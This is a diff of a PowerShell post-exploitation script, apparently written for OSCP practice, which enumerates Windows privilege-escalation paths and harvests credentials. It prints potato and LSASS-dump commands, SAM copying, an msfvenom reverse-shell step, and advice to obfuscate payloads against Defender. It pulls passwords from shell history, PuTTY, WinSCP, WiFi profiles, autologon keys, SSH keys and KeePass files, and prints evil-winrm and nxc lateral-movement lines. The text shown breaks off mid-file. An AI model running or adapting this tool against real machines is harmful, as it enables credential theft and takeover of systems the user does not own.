@@ -2,7 +2,7 @@
 # win-korek.ps1 - Privilege Escalation & Credential Enumeration
 # Post-foothold local privilege escalation gap filler (pairs with winPEAS)
 # Focused on OSCP: token privs, service misconfigs, credential recovery, AD
-# Author: korek (upgraded)
+# Author: korek
 # =============================================================================
 # Usage:
 #   . .\win-korek.ps1; Invoke-Korek
@@ -16,255 +16,236 @@ function Invoke-Korek {
         [switch]$Verbose = $false
     )
 
-    $out = [System.Collections.ArrayList]@()
-    $findings = [System.Collections.ArrayList]@()  # priority findings
+    $out      = [System.Collections.ArrayList]@()
+    $findings = [System.Collections.ArrayList]@()
 
-    function Log  { 
-        param([string]$m, [string]$c = "White")
-        Write-Host $m -ForegroundColor $c
-        if ($OutputFile) { $out.Add($m) | Out-Null }
-    }
-    function Hit  { param([string]$m) ; Log "[+] $m" "Green" ; $findings.Add("[+] $m") | Out-Null }
-    function Hot  { param([string]$m) ; Log "[!!] $m" "Red" ; $findings.Add("[!!] $m") | Out-Null }
+    function Log  { param([string]$m,[string]$c="White") ; Write-Host $m -ForegroundColor $c ; if($OutputFile){$out.Add($m)|Out-Null} }
+    function Hit  { param([string]$m) ; Log "[+] $m" "Green"  ; $findings.Add("[+] $m")|Out-Null }
+    function Hot  { param([string]$m) ; Log "[!!] $m" "Red"   ; $findings.Add("[!!] $m")|Out-Null }
     function Info { param([string]$m) ; Log "    >>> $m" "Gray" }
     function Sec  { param([string]$m) ; Log "`n[*] === $m ===" "Cyan" }
     function Expl { param([string]$m) ; Log "    [EXPLOIT] $m" "Yellow" }
-    function DBG  { param([string]$m) ; if ($Verbose) { Log "    [DBG] $m" "DarkGray" } }
+    function DBG  { param([string]$m) ; if($Verbose){ Log "    [DBG] $m" "DarkGray" } }
 
     function Get-FileSafe {
         param([string]$p)
-        try {
-            if (Test-Path $p -ErrorAction Stop) {
-                $f = Get-Item $p -ErrorAction Stop
-                if ($f.Length -gt 0 -and -not $f.PSIsContainer) { return $f }
-            }
-        } catch {}
+        try { if(Test-Path $p -EA Stop){ $f=Get-Item $p -EA Stop; if($f.Length -gt 0 -and -not $f.PSIsContainer){return $f} } } catch{}
         return $null
     }
     function Get-ContentSafe {
-        param([string]$p, [int]$n = 30)
-        try { return Get-Content $p -ErrorAction Stop -TotalCount $n }
-        catch {}
-        return $null
+        param([string]$p,[int]$n=30)
+        try { return Get-Content $p -EA Stop -TotalCount $n } catch { return $null }
     }
     function Get-Reg {
-        param([string]$p, [string]$k)
-        try { return (Get-ItemProperty $p -Name $k -ErrorAction Stop).$k }
-        catch {}
-        return $null
+        param([string]$p,[string]$k)
+        try { return (Get-ItemProperty $p -Name $k -EA Stop).$k } catch { return $null }
     }
-    function Test-PathWritable {
+    function Test-Writable {
+        # Returns $true if current user can write to the given file or directory
         param([string]$path)
         try {
-            $testFile = [System.IO.Path]::GetTempFileName()
-            Copy-Item $testFile $path -ErrorAction Stop
-            Remove-Item "$path\*" -ErrorAction SilentlyContinue
-            return $true
+            if ([System.IO.Directory]::Exists($path)) {
+                $tmp = [System.IO.Path]::Combine($path, [System.IO.Path]::GetRandomFileName())
+                [System.IO.File]::WriteAllText($tmp, "t")
+                Remove-Item $tmp -EA SilentlyContinue
+                return $true
+            } elseif ([System.IO.File]::Exists($path)) {
+                $fs = [System.IO.File]::OpenWrite($path)
+                $fs.Close()
+                return $true
+            }
         } catch {}
         return $false
     }
 
     Log "============================================================" "Cyan"
-    Log "  win-korek.ps1 - Privilege Escalation Gap Filler" "Cyan"
-    Log "  Token privs | Service misconfigs | Credentials | AD" "Cyan"
-    Log "  Run AFTER winPEAS for complete local enum coverage" "Cyan"
+    Log "  win-korek.ps1 - PrivEsc & Cred Gap Filler" "Cyan"
+    Log "  Token privs | Service misconfigs | Creds | AD" "Cyan"
+    Log "  Run AFTER winPEAS for complete coverage" "Cyan"
     Log "============================================================" "Cyan"
 
     # ------------------------------------------------------------------
     # CONTEXT
     # ------------------------------------------------------------------
     Sec "CONTEXT"
-    $whoami = whoami
-    Log "User: $whoami" "White"
-    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-    if ($isAdmin) { Hot "Running as ADMINISTRATOR" } else { Info "Not running as admin (UAC may block some checks)" }
+    $whoami   = whoami
+    $isAdmin  = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
     $isSystem = $whoami -eq "nt authority\system"
-    if ($isSystem) { Hot "Running as SYSTEM" }
     $isDomain = -not ([string]::IsNullOrEmpty($env:USERDNSDOMAIN))
+    Log "User: $whoami" "White"
+    if ($isSystem) { Hot "Running as SYSTEM" }
+    elseif ($isAdmin) { Hot "Running as ADMINISTRATOR" }
+    else { Info "Standard user (UAC may block some checks)" }
     if ($isDomain) { Hit "Domain-joined: $env:USERDNSDOMAIN" } else { Info "Not domain-joined (standalone)" }
 
     # ------------------------------------------------------------------
-    # TOKEN PRIVILEGES (the potato decision tree)
+    # TOKEN PRIVILEGES
     # ------------------------------------------------------------------
-    Sec "TOKEN PRIVILEGES (potato/privesc viability)"
+    Sec "TOKEN PRIVILEGES (potato / privesc decision)"
     try {
         $privs = whoami /priv /fo csv 2>$null | ConvertFrom-Csv
-        $hasSeImpersonate = $false
-        $hasSeAssignPrimary = $false
-        $hasSeDebug = $false
-        $hasSeBackup = $false
-
+        $anyHot = $false
         $privs | ForEach-Object {
-            $name = $_."Privilege Name"
+            $name  = $_."Privilege Name"
             $state = $_."State"
             if ($state -match "Enabled") {
-                if ($name -eq "SeImpersonatePrivilege") {
-                    Hot "SeImpersonatePrivilege ENABLED → JuicyPotato/GodPotato viable"
-                    Expl "JuicyPotatoNG.exe / GodPotato / PrintSpoofer / SigmaPotato"
-                    $hasSeImpersonate = $true
-                }
-                if ($name -eq "SeAssignPrimaryTokenPrivilege") {
-                    Hot "SeAssignPrimaryTokenPrivilege ENABLED → token swapping viable"
-                    Expl "JuicyPotato / JuicyPotatoNG.exe"
-                    $hasSeAssignPrimary = $true
-                }
-                if ($name -eq "SeDebugPrivilege") {
-                    Hot "SeDebugPrivilege ENABLED → process injection / MinidumpWriteDump viable"
-                    Expl "lsass dump → secretsdump.py"
-                    $hasSeDebug = $true
-                }
-                if ($name -eq "SeBackupPrivilege") {
-                    Hot "SeBackupPrivilege ENABLED → can read SAM/SYSTEM/NTDS"
-                    Expl "copy C:\Windows\System32\config\SAM ; robocopy C:\Windows\System32\config C:\temp /S /SE"
-                    $hasSeBackup = $true
-                }
-                if ($name -eq "SeTakeOwnershipPrivilege") {
-                    Hit "SeTakeOwnershipPrivilege ENABLED → can own/modify files"
-                }
-                if ($name -eq "SeLoadDriverPrivilege") {
-                    Hot "SeLoadDriverPrivilege ENABLED → arbitrary kernel code execution"
-                    Expl "AtlasDriver / Capcom / ExploitDB kernel exploit"
+                switch ($name) {
+                    "SeImpersonatePrivilege"      { Hot "SeImpersonatePrivilege ENABLED → JuicyPotato / GodPotato / PrintSpoofer"; Expl "GodPotato.exe -cmd 'cmd /c whoami'"; $anyHot=$true }
+                    "SeAssignPrimaryTokenPrivilege" { Hot "SeAssignPrimaryTokenPrivilege ENABLED → JuicyPotato"; Expl "JuicyPotatoNG.exe -t * -p cmd.exe"; $anyHot=$true }
+                    "SeDebugPrivilege"            { Hot "SeDebugPrivilege ENABLED → dump LSASS"; Expl "procdump.exe -ma lsass.exe lsass.dmp  OR  Task Manager dump"; $anyHot=$true }
+                    "SeBackupPrivilege"           { Hot "SeBackupPrivilege ENABLED → read SAM/SYSTEM/NTDS"; Expl "robocopy C:\Windows\System32\config C:\temp SAM SYSTEM /B"; $anyHot=$true }
+                    "SeTakeOwnershipPrivilege"    { Hit "SeTakeOwnershipPrivilege ENABLED → can take ownership of files" }
+                    "SeLoadDriverPrivilege"       { Hot "SeLoadDriverPrivilege ENABLED → arbitrary kernel code"; Expl "EopLoadDriver + vulnerable driver"; $anyHot=$true }
+                    "SeRestorePrivilege"          { Hit "SeRestorePrivilege ENABLED → can write arbitrary files" }
+                    "SeCreateSymbolicLinkPrivilege" { Hit "SeCreateSymbolicLinkPrivilege ENABLED → symlink attacks" }
                 }
             }
         }
-        if (-not ($hasSeImpersonate -or $hasSeAssignPrimary -or $hasSeDebug -or $hasSeBackup)) {
-            Info "No high-value token privileges — focus on service misconfigs / unquoted paths"
-        }
-    } catch {
-        DBG "whoami /priv failed: $_"
-    }
+        if (-not $anyHot) { Info "No high-value token privileges — focus on service / cred checks below" }
+    } catch { DBG "whoami /priv failed: $_" }
 
     # ------------------------------------------------------------------
     # AV / DEFENDER STATE
     # ------------------------------------------------------------------
     Sec "ANTIVIRUS & DEFENDER STATE"
     try {
-        $defender = Get-MpComputerStatus -ErrorAction SilentlyContinue
-        if ($defender) {
-            if ($defender.RealTimeProtectionEnabled) {
-                Hit "Windows Defender REAL-TIME PROTECTION ENABLED — payloads may be blocked"
-                Info "RealTimeProtectionEnabled: $($defender.RealTimeProtectionEnabled)"
-                Info "IsTamperProtected: $($defender.IsTamperProtected)"
+        $def = Get-MpComputerStatus -EA SilentlyContinue
+        if ($def) {
+            if ($def.RealTimeProtectionEnabled) { Hit "Defender RealTime ON — obfuscate payloads" }
+            else { Info "Defender RealTime DISABLED — payload delivery easier" }
+            Info "IsTamperProtected: $($def.IsTamperProtected)"
+        } else { Info "Cannot query Defender status" }
+    } catch { DBG "Get-MpComputerStatus error: $_" }
+
+    # ------------------------------------------------------------------
+    # WRITABLE SERVICE BINARIES (only report confirmed-writable)
+    # ------------------------------------------------------------------
+    Sec "WRITABLE SERVICE BINARIES (confirmed writable only)"
+    try {
+        $svcCount = 0
+        Get-WmiObject Win32_Service -EA SilentlyContinue |
+        Where-Object { $_.PathName -ne $null } |
+        ForEach-Object {
+            $svc  = $_
+            $path = $svc.PathName -replace '^"([^"]+)".*','$1'
+            if (-not (Test-Path $path -EA SilentlyContinue)) { return }
+            if (Test-Writable $path) {
+                Hot "WRITABLE SERVICE BINARY: '$($svc.Name)' → $path"
+                Info "Runs as: $($svc.StartName)"
+                Expl "cp malicious.exe '$path' ; Restart-Service $($svc.Name)"
+                $svcCount++
             } else {
-                Info "Defender RealTime disabled (better for payload delivery)"
+                DBG "Not writable (skipped): $path"
             }
-            if ($defender.AntivirusEnabled) { Info "Antivirus: $($defender.AntivirusEnabled)" }
         }
-    } catch {
-        DBG "Get-MpComputerStatus failed (may indicate old/disabled Defender): $_"
-    }
+        if ($svcCount -eq 0) { Info "No writable service binaries found" }
+    } catch { DBG "Service binary check error: $_" }
 
     # ------------------------------------------------------------------
-    # WRITABLE SERVICE BINARIES (actual test, not just "check icacls")
+    # UNQUOTED SERVICE PATHS (only report if exploit path is writable)
     # ------------------------------------------------------------------
-    Sec "WRITABLE SERVICE BINARIES (actively tested)"
+    Sec "UNQUOTED SERVICE PATHS (confirmed writable exploit path only)"
     try {
-        $services = Get-WmiObject Win32_Service -ErrorAction SilentlyContinue |
-            Where-Object { $_.PathName -ne $null -and $_.PathName -ne "" }
+        $uqCount = 0
+        Get-WmiObject Win32_Service -EA SilentlyContinue |
+        Where-Object {
+            $_.PathName -notmatch '"' -and
+            $_.PathName -match ' ' -and
+            $_.PathName -notmatch "^C:\\Windows" -and
+            $_.PathName -ne $null
+        } | ForEach-Object {
+            $svc  = $_
+            $raw  = $svc.PathName.Trim()
+            # build candidate exploit paths (e.g. C:\Program.exe, C:\Program Files\App.exe)
+            $parts = $raw -split '\s+'
+            $candidates = @()
+            $built = ""
+            foreach ($part in $parts) {
+                if ($built -eq "") { $built = $part } else { $built += " $part" }
+                if ($built -match "\.exe$") { break }
+                $candidates += "$built.exe"
+            }
 
-        $writableCount = 0
-        $services | ForEach-Object {
-            $svc = $_
-            $pathRaw = $svc.PathName
-            # strip quotes and args
-            $path = $pathRaw -replace '^"([^"]+)".*', '$1'
-            if (-not (Test-Path $path -ErrorAction SilentlyContinue)) { return }
-
-            # test if writable
-            try {
-                $acl = Get-Acl $path -ErrorAction Stop
-                $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
-                $principal = [System.Security.Principal.WindowsPrincipal]$identity
-
-                $hasWrite = $false
-                foreach ($access in $acl.Access) {
-                    if ($principal.IsInRole($access.IdentityReference) -and
-                        ($access.FileSystemRights -match "Write|Modify|FullControl" -and
-                         $access.AccessControlType -eq "Allow")) {
-                        $hasWrite = $true; break
-                    }
-                }
-                if ($hasWrite) {
-                    Hot "WRITABLE: Service '$($svc.Name)' binary: $path"
+            $exploitable = $false
+            foreach ($c in $candidates) {
+                $dir = Split-Path $c -Parent
+                if ((Test-Path $dir -EA SilentlyContinue) -and (Test-Writable $dir)) {
+                    Hot "EXPLOITABLE UNQUOTED PATH: '$($svc.Name)'"
+                    Info "Service path: $raw"
                     Info "Runs as: $($svc.StartName)"
-                    Expl "cp malicious.exe '$path' ; Restart-Service $($svc.Name)"
-                    $writableCount++
+                    Hot "Place malicious exe at: $c"
+                    Expl "msfvenom -p windows/x64/shell_reverse_tcp ... -f exe -o '$c'"
+                    Expl "Restart-Service $($svc.Name)  OR  sc.exe stop/start $($svc.Name)"
+                    $exploitable = $true
+                    $uqCount++
+                    break
                 }
-            } catch {
-                DBG "ACL check failed for $path : $_"
+            }
+            if (-not $exploitable) {
+                DBG "Unquoted but no writable path (skipped): $raw"
             }
         }
-        if ($writableCount -eq 0) { Info "No directly-writable service binaries found" }
-    } catch {
-        DBG "Service binary check failed: $_"
-    }
+        if ($uqCount -eq 0) { Info "No exploitable unquoted paths (write-verified)" }
+    } catch { DBG "Unquoted path check error: $_" }
 
     # ------------------------------------------------------------------
-    # UNQUOTED SERVICE PATHS (exploitable write paths)
+    # WRITABLE PATH DIRECTORIES (DLL hijacking)
     # ------------------------------------------------------------------
-    Sec "UNQUOTED SERVICE PATHS"
-    try {
-        $unquoted = Get-WmiObject Win32_Service -ErrorAction SilentlyContinue |
-            Where-Object {
-                $_.PathName -notmatch '"' -and
-                $_.PathName -match ' ' -and
-                $_.PathName -notmatch "^C:\\Windows" -and
-                $_.PathName -ne $null
-            }
-
-        $unquoted | ForEach-Object {
-            Hot "Unquoted: '$($_.Name)' -> $($_.PathName)"
-            Info "Runs as: $($_.StartName)"
-            $pathParts = ($_.PathName -split ' ')[0..1] -join ' '
-            Info "Exploitable: place exe before space: $pathParts"
-            Expl "icacls 'C:\Program Files\App\' to check write perms"
+    Sec "WRITABLE PATH DIRECTORIES (DLL hijack — confirmed writable only)"
+    $pathCount = 0
+    $env:PATH -split ';' | Where-Object { $_ -ne "" } | ForEach-Object {
+        $dir = $_.Trim()
+        if ((Test-Path $dir -EA SilentlyContinue) -and (Test-Writable $dir)) {
+            Hot "WRITABLE PATH DIR: $dir"
+            Expl "Drop malicious DLL here — processes loading from PATH will pick it up"
+            $pathCount++
+        } else {
+            DBG "PATH dir not writable (skipped): $dir"
         }
-    } catch {
-        DBG "Unquoted service check failed: $_"
     }
+    if ($pathCount -eq 0) { Info "No writable PATH directories found" }
 
     # ------------------------------------------------------------------
-    # SCHEDULED TASKS RUNNING AS SYSTEM/HIGH (writable tasks)
+    # SCHEDULED TASKS (SYSTEM/HIGH — writable binary only)
     # ------------------------------------------------------------------
-    Sec "SCHEDULED TASKS (SYSTEM/HIGH privilege)"
+    Sec "SCHEDULED TASKS (SYSTEM/HIGH — writable binary only)"
     try {
-        $tasks = Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object {
-            $_.Principal.UserId -match "SYSTEM|S-1-5-18" -or
-            $_.Principal.RunLevel -eq "Highest"
-        }
-
-        $tasks | ForEach-Object {
+        $taskCount = 0
+        Get-ScheduledTask -EA SilentlyContinue |
+        Where-Object { $_.Principal.UserId -match "SYSTEM|S-1-5-18" -or $_.Principal.RunLevel -eq "Highest" } |
+        ForEach-Object {
             $task = $_
-            $taskPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$($task.TaskName)"
-            Hit "Scheduled Task: $($task.TaskName)"
-            Info "RunLevel: $($task.Principal.RunLevel) | User: $($task.Principal.UserId)"
-
             try {
                 $action = $task.Actions[0]
-                if ($action) {
+                if ($action -and $action.Execute) {
                     $exe = $action.Execute
-                    Info "Execute: $exe"
-                    if (Test-Path $exe -ErrorAction SilentlyContinue) {
-                        $acl = Get-Acl $exe -ErrorAction SilentlyContinue
-                        $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
-                        $principal = [System.Security.Principal.WindowsPrincipal]$identity
-                        foreach ($access in $acl.Access) {
-                            if ($principal.IsInRole($access.IdentityReference) -and
-                                $access.FileSystemRights -match "Write|Modify" -and
-                                $access.AccessControlType -eq "Allow") {
-                                Expl "WRITABLE TASK EXECUTABLE: $exe → replace with malicious.exe"
+                    if ((Test-Path $exe -EA SilentlyContinue) -and (Test-Writable $exe)) {
+                        Hot "WRITABLE TASK BINARY: '$($task.TaskName)' → $exe"
+                        Info "RunLevel: $($task.Principal.RunLevel) | User: $($task.Principal.UserId)"
+                        Expl "Replace $exe with malicious binary and wait for task to run"
+                        $taskCount++
+                    } else {
+                        # Also check if the script/argument file is writable
+                        $arg = $action.Arguments
+                        if ($arg -match "([A-Za-z]:\\[^\s]+\.(ps1|bat|cmd|vbs))") {
+                            $scriptPath = $Matches[1]
+                            if ((Test-Path $scriptPath -EA SilentlyContinue) -and (Test-Writable $scriptPath)) {
+                                Hot "WRITABLE TASK SCRIPT: '$($task.TaskName)' → $scriptPath"
+                                Info "Runs as: $($task.Principal.UserId)"
+                                Expl "Overwrite $scriptPath with malicious code"
+                                $taskCount++
                             }
                         }
+                        DBG "Task '$($task.TaskName)' not writable (skipped)"
                     }
                 }
             } catch {}
         }
-    } catch {
-        DBG "Scheduled tasks check failed: $_"
-    }
+        if ($taskCount -eq 0) { Info "No writable scheduled task binaries/scripts found" }
+    } catch { DBG "Scheduled task check error: $_" }
 
     # ------------------------------------------------------------------
-    # 1. SAM/SYSTEM/NTDS BACKUPS
+    # SAM / SYSTEM / NTDS BACKUPS
     # ------------------------------------------------------------------
     Sec "SAM / SYSTEM / NTDS BACKUPS"
     @(
@@ -287,287 +268,331 @@ function Invoke-Korek {
     }
 
     # ------------------------------------------------------------------
-    # 2. POWERSHELL HISTORY (credential-focused grep)
+    # POWERSHELL HISTORY
     # ------------------------------------------------------------------
-    Sec "POWERSHELL HISTORY (high-value credential patterns)"
+    Sec "POWERSHELL HISTORY"
     try {
-        Get-Item "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue |
+        Get-Item "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -EA SilentlyContinue |
         Where-Object { $_.Length -gt 0 } | ForEach-Object {
-            Hit "History file: $($_.FullName)"
+            Hit "History: $($_.FullName)"
             $content = Get-ContentSafe $_.FullName 500
-            if ($content) {
-                # grep only the high-signal lines
-                $content | Where-Object {
-                    $_ -match "(?i)(password|passwd|pwd|cred|secret|token|key|api.?key|auth|bearer|runas|invoke-.*-password|iwr.*-credential|-pw\s|net\s+use|Start-Process.*-credential)" -and
-                    $_ -notmatch "^#|^//|<!-- |echo.*password"
-                } | ForEach-Object {
-                    Hot "INTERESTING: $_"
-                    if ($_ -match "-pw\s+'?([^'\s]+)'?") { Hot "PASSWORD EXTRACTED: $($Matches[1])" }
-                    if ($_ -match "(?i)password['\"]?\s*=\s*['\"]?([^'\"]+)") { Hot "CRED FOUND: $($Matches[1])" }
-                }
+            # print all lines
+            $content | ForEach-Object { Info ">> $_" }
+            # highlight credential lines
+            $content | Where-Object {
+                $_ -match "(?i)(password|passwd|pwd|cred|secret|token|-pw\s|net use|runas|Start-Process.*-cred|invoke.*-pass)" -and
+                $_ -notmatch "^#"
+            } | ForEach-Object {
+                Hot "CRED LINE: $_"
+                if ($_ -match "-pw\s+'?([^'\s]+)'?") { Hot "PASSWORD: $($Matches[1])" }
             }
         }
     } catch {}
 
     # ------------------------------------------------------------------
-    # 3. PUTTY / WINSCP SAVED SESSIONS (session method + direct values)
+    # PUTTY / WINSCP SAVED SESSIONS
     # ------------------------------------------------------------------
     Sec "PUTTY / WINSCP SAVED SESSIONS"
     try {
         $puttyBase = "HKCU:\Software\SimonTatham\PuTTY\Sessions"
-        if (Test-Path $puttyBase -ErrorAction SilentlyContinue) {
-            $puttySessions = Get-ChildItem $puttyBase -ErrorAction SilentlyContinue
-            if ($puttySessions) {
-                $puttySessions | ForEach-Object {
-                    $sessionName = $_.PSChildName
-                    $h = Get-Reg $_.PSPath "HostName"
-                    $u = Get-Reg $_.PSPath "UserName"
-                    $p = Get-Reg $_.PSPath "PublicKeyFile"
-                    if ($h) {
-                        Hit "PuTTY Session: $sessionName"
-                        Info "Host: $h | User: $u"
-                        if ($p) { Info "KeyFile: $p" }
-                        Expl "ssh -i keyfile $u@$h"
-                    }
-                    # grep registry values for -pw patterns
-                    try {
-                        Get-ItemProperty $_.PSPath -ErrorAction Stop |
-                        Select-Object -Property * -ExcludeProperty PS* |
-                        Get-Member -MemberType NoteProperty -ErrorAction SilentlyContinue |
-                        ForEach-Object {
-                            $val = (Get-ItemProperty "$puttyBase\$sessionName" -ErrorAction SilentlyContinue).$($_.Name)
-                            if ($val -match "-pw\s+'?([^'\s]+)'?") {
-                                Hot "PASSWORD IN PUTTY CONFIG: $($Matches[1])"
-                                Expl "$u@$h / $($Matches[1])"
-                            }
-                        }
-                    } catch {}
+        if (Test-Path $puttyBase -EA SilentlyContinue) {
+            # Method 1: standard subkeys
+            Get-ChildItem $puttyBase -EA SilentlyContinue | ForEach-Object {
+                $name = $_.PSChildName
+                $h = Get-Reg $_.PSPath "HostName"
+                $u = Get-Reg $_.PSPath "UserName"
+                if ($h) {
+                    Hit "PuTTY subkey session: $name → $u@$h"
+                    Expl "Try: ssh $u@$h"
                 }
+                # grep values inside subkey for -pw
+                try {
+                    Get-ItemProperty $_.PSPath -EA Stop |
+                    Select-Object -Property * -ExcludeProperty PS* |
+                    Get-Member -MemberType NoteProperty -EA SilentlyContinue | ForEach-Object {
+                        $val = (Get-ItemProperty "$puttyBase\$name" -EA SilentlyContinue).$($_.Name)
+                        if ($val -match "-pw\s+'?([^'\s]+)'?") {
+                            Hot "PASSWORD IN PUTTY SUBKEY VALUE: $($Matches[1])"
+                            if ($val -match "(\w+)@([\d\.a-zA-Z]+)") { Info "User@Host: $($Matches[0])" }
+                            Expl "Try: ssh $($Matches[0]) -p extracted_password"
+                        }
+                    }
+                } catch {}
             }
-        }
+            # Method 2: values stored DIRECTLY on Sessions key (non-standard, e.g. zachary box)
+            try {
+                $directVals = Get-ItemProperty $puttyBase -EA Stop
+                $directVals.PSObject.Properties |
+                Where-Object { $_.Name -notmatch "^PS" } |
+                ForEach-Object {
+                    $val = $_.Value
+                    if ($val -match "-pw\s+'?([^'\s]+)'?") {
+                        Hot "PUTTY DIRECT SESSION CRED: $($_.Name) = $val"
+                        Hot "PASSWORD EXTRACTED: $($Matches[1])"
+                        if ($val -match "(\w+)@([\d\.a-zA-Z]+)") { Info "User@Host: $($Matches[0])" }
+                        Expl "ssh or use extracted password directly"
+                    }
+                }
+            } catch {}
+        } else { Info "No PuTTY sessions found" }
     } catch {}
 
     try {
-        $winscpSessions = Get-ChildItem "HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions" -ErrorAction SilentlyContinue
-        if ($winscpSessions) {
-            $winscpSessions | ForEach-Object {
-                $h = Get-Reg $_.PSPath "HostName"
-                $u = Get-Reg $_.PSPath "UserName"
-                $p = Get-Reg $_.PSPath "Password"
-                if ($h) {
-                    Hot "WinSCP Session: $($_.PSChildName) -> $h"
-                    Info "User: $u"
-                    Expl "WinSCP password (obfuscated): use https://github.com/anoopengineer/winscppasswd"
-                }
+        Get-ChildItem "HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions" -EA SilentlyContinue | ForEach-Object {
+            $h = Get-Reg $_.PSPath "HostName"
+            $u = Get-Reg $_.PSPath "UserName"
+            $p = Get-Reg $_.PSPath "Password"
+            if ($h) {
+                Hot "WinSCP session: $($_.PSChildName) → $u@$h"
+                if ($p) { Info "Obfuscated password: $p" }
+                Expl "Decrypt: python3 winscppasswd.py $h $u $p"
             }
         }
     } catch {}
 
     # ------------------------------------------------------------------
-    # 4. WIFI PASSWORDS
+    # WIFI PASSWORDS
     # ------------------------------------------------------------------
     Sec "WIFI PASSWORDS"
     try {
-        $profiles = netsh wlan show profiles 2>$null | Select-String "Profile\s*:\s*(.+)"
-        if ($profiles) {
-            $profiles | ForEach-Object {
-                $name = $_.Matches.Groups[1].Value.Trim()
-                $key = netsh wlan show profile name="$name" key=clear 2>$null | Select-String "Key Content\s*:\s*(.+)"
-                if ($key) {
-                    Hot "WiFi '$name': $($key.Matches.Groups[1].Value.Trim())"
-                }
-            }
+        netsh wlan show profiles 2>$null | Select-String "Profile\s*:\s*(.+)" | ForEach-Object {
+            $n = $_.Matches.Groups[1].Value.Trim()
+            $k = netsh wlan show profile name="$n" key=clear 2>$null | Select-String "Key Content\s*:\s*(.+)"
+            if ($k) { Hot "WiFi '$n': $($k.Matches.Groups[1].Value.Trim())" }
         }
     } catch {}
 
     # ------------------------------------------------------------------
-    # 5. AUTOLOGON CREDENTIALS
+    # AUTOLOGON CREDENTIALS
     # ------------------------------------------------------------------
-    Sec "AUTOLOGON CREDENTIALS (Winlogon LSA secret)"
+    Sec "AUTOLOGON CREDENTIALS"
     $autoUser = Get-Reg "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "DefaultUserName"
     $autoPass = Get-Reg "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "DefaultPassword"
-    $autoDomain = Get-Reg "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "DefaultDomainName"
+    $autoDom  = Get-Reg "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "DefaultDomainName"
     if ($autoPass) {
         Hot "AUTOLOGON CREDENTIALS FOUND!"
-        Hit "Domain: $autoDomain | User: $autoUser"
-        Expl "Password: $autoPass"
+        Info "Domain: $autoDom | User: $autoUser | Pass: $autoPass"
         Expl "evil-winrm -i TARGET -u '$autoUser' -p '$autoPass'"
-        Expl "nxc smb TARGET -u '$autoUser' -p '$autoPass' --local-auth (try lateral move)"
-    } else {
-        Info "No autologon credentials found"
-    }
+        Expl "nxc smb TARGET -u '$autoUser' -p '$autoPass' --local-auth"
+    } else { Info "No autologon credentials" }
 
     # ------------------------------------------------------------------
-    # 6. CREDENTIAL MANAGER
+    # CREDENTIAL MANAGER
     # ------------------------------------------------------------------
-    Sec "CREDENTIAL MANAGER (cmdkey vault)"
+    Sec "CREDENTIAL MANAGER"
     try {
         $creds = cmdkey /list 2>$null
-        if ($creds -match "Target:|User") {
-            $creds | Where-Object { $_ -match "Target:|User" } | ForEach-Object {
-                Hit "Stored credential: $_"
-            }
-            Expl "runas /savecred /user:DOMAIN\USER cmd.exe   (reuse cred without typing password)"
+        $creds | Where-Object { $_ -match "Target|User" } | ForEach-Object {
+            Hit "Stored credential: $_"
+            Expl "runas /savecred /user:DOMAIN\USER cmd.exe"
         }
     } catch {}
 
     # ------------------------------------------------------------------
-    # 7. SSH PRIVATE KEYS
+    # SSH PRIVATE KEYS
     # ------------------------------------------------------------------
     Sec "SSH PRIVATE KEYS"
-    @("C:\Users\*\.ssh\", "C:\Users\*\Documents\", "C:\Users\*\Desktop\", "C:\ProgramData\") | ForEach-Object {
+    @("C:\Users\*\.ssh\","C:\Users\*\Documents\","C:\Users\*\Desktop\","C:\ProgramData\") | ForEach-Object {
         try {
-            Get-ChildItem $_ -ErrorAction SilentlyContinue | Where-Object {
+            Get-ChildItem $_ -EA SilentlyContinue | Where-Object {
                 $_.Name -match "^(id_rsa|id_dsa|id_ecdsa|id_ed25519)$|\.pem$|\.ppk$" -and $_.Length -gt 0
             } | ForEach-Object {
                 Hot "SSH Key: $($_.FullName)"
                 $c = Get-ContentSafe $_.FullName 3
-                if ($c -match "PRIVATE") { Info "Contains PRIVATE KEY — steal it" }
+                if ($c -match "PRIVATE") { Info "Contains PRIVATE KEY" }
                 Expl "Transfer to Kali: ssh -i keyfile user@target"
             }
         } catch {}
     }
 
     # ------------------------------------------------------------------
-    # 8. KEEPASS / PASSWORD FILES
+    # KEEPASS / PASSWORD FILES
     # ------------------------------------------------------------------
-    Sec "KEEPASS / PASSWORD DATABASES"
+    Sec "KEEPASS / PASSWORD FILES"
     try {
-        Get-ChildItem C:\ -Recurse -Depth 6 -ErrorAction SilentlyContinue |
+        Get-ChildItem C:\ -Recurse -Depth 6 -EA SilentlyContinue |
         Where-Object { $_.Name -match "\.kdbx$|\.kdb$|^pass.*\.txt$|^cred.*\.txt$" -and $_.Length -gt 0 } |
         ForEach-Object {
             Hot "Password file: $($_.FullName) ($($_.Length) bytes)"
-            Expl "Transfer to Kali and crack: keepass2john file.kdbx | hashcat -m 13400"
+            Expl "keepass2john file.kdbx | hashcat -m 13400"
         }
     } catch {}
 
     # ------------------------------------------------------------------
-    # 9. STICKY NOTES
+    # STICKY NOTES
     # ------------------------------------------------------------------
-    Sec "STICKY NOTES (plum.sqlite)"
+    Sec "STICKY NOTES"
     try {
-        Get-Item "C:\Users\*\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes*\LocalState\plum.sqlite" -ErrorAction SilentlyContinue |
-        Where-Object { $_.Length -gt 0 } |
-        ForEach-Object {
